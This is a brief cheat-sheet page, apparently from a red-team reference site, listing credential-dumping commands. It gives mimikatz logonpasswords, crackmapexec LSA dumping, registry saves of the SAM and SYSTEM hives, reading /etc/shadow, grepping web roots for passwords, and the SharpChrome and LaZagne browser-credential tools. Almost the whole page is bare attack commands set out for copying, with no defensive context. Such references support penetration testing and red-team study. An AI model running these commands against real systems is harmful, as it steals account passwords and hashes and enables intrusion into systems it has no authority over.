---
title: Credential Access
date: 2026-01-22
background: bg-[#A855F7]
icon: lock-open.svg
tags:
  - credentials
  - dumping
  - red teaming
  - penetration testing
categories:
  - Tactics, Techniques, and Procedures
intro:
  Credential harvesting and dumping techniques commonly observed in real-world intrusions.
plugins:
  - copyCode
---

## Windows Credential Dumping

mimikatz  
sekurlsa::logonpasswords  

crackmapexec smb target -u user -p pass --lsa  

## SAM Dumping

reg save HKLM\SAM sam.save  
reg save HKLM\SYSTEM system.save  

## Linux Credentials

cat /etc/shadow  
grep -R "password" /var/www  

## Browser Credentials

SharpChrome  
LaZagne.exe
